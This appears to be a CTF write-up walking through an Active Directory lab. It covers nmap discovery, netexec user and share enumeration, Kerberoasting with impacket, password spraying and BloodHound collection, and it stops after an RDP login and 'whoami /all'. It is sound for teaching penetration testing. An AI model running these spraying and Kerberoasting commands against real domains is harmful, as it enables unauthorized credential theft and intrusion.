# Active Directory CTF Write-Up
in this challange we're given internal access with a set of credentials                                  
username: ctf.local\j.smith
password: JSmith@IT2024                                                                                  
and walks through logging in remotely to the machine via RDP -> then exploiting a vulnerability in  SeMachineAccount Privilege to obtain Domain Admin access

# Environment Set-Up:
Machine_IP: 10.112.130.201                                                                               Before starting, DNS resolution must point to the Domain Controller. this is critical for Kerberos-based attacks, which we'll need later

# Host Discovery & Port Scan:
1. `nmap -sn 10.112.130.0/24 -T4`        to discover live hosts
<img width="797" height="291" alt="Screenshot 2026-08-31 215131" src="https://github.com/user-attachments/assets/add16d3a-f0bb-472b-95ff-b981d233dae6" />

2. `nmap -sV -sC -iL hosts.txt -oN fill_scan.txt -T4`    only 10.112.130.201 holds valuable information
<img width="1321" height="782" alt="Screenshot 2026-08-31 215157" src="https://github.com/user-attachments/assets/38023d41-59ba-4978-a747-a9e4b2541ef5" />

# Enumeration:
1. I started off with Username Enumeration and saved usernames to users.txt file for further enumeration
`netexec smb 10.112.130.201 -u j.smith -p JSMITH@IT2024 --users`
<img width="1766" height="315" alt="Screenshot 2026-08-31 215238" src="https://github.com/user-attachments/assets/f4c8bb82-f06f-408b-a770-f916d0057d88" />

2. I enumerated SMB shares:
  `netexec smb 10.112.130.201 -u j.smith -p JSmith@IT2024 --shares`
<img width="1732" height="292" alt="Pasted image 20260831215926" src="https://github.com/user-attachments/assets/69b4687d-1495-4158-bf07-a50ad5b5dba0" />
i tried to connect to each share but nothing is these

3. Kerberoasting:
  `impacket/GetUserSPNs.py ctf.local/j.smith -dc-ip 10.112.130.201 -request`
<img width="1913" height="498" alt="Pasted image 20260831220101" src="https://github.com/user-attachments/assets/9435b05a-9a72-48a3-8fa5-88c602cb4cee" />
i got TGS-REP encrypted blob for user svc.helpdesk, but upon trying to crack it, no results

4. since password reuse is common in AD environment, i tried to spray the given password across users
  `netexec smb 10.112.130.201 -u users.txt -p JSmith@IT2024 --continue-on-success`
<img width="1531" height="196" alt="Pasted image 20260901040842" src="https://github.com/user-attachments/assets/ed9a66f3-4d9a-45ce-b8d7-da03ed1cc494" />
No new findings


# BloodHound
1. collect domain information:
  `bloodhound-python -c all -u j.smith -p JSmith@IT2024 -d ctf.local -ns 10.112.130.201 --zip`
<img width="997" height="460" alt="Pasted image 20260901013422" src="https://github.com/user-attachments/assets/5c09ca7b-3b19-4390-b514-cfc2d79f0730" />

2. run bloodhound & import the collected zip file
  `bloodhound-start` -> access from 127.0.0.1:8080 -> login creds admin admin -> import the zip file

 found that user j.smith is a member of the "Remote Desktop Users" 
users of this group are allowed to login remotely via RDP
	` xfreerdp3 /dynamic-resolution +clipboard /cert:ignore /u:j.smith /p:JSmith@IT2024 /v:10.112.130.201`
	and i successfully logged-in

# Living Off the Land
1. i opened cmd and check for groups and privielges:  
`whoami /all` 







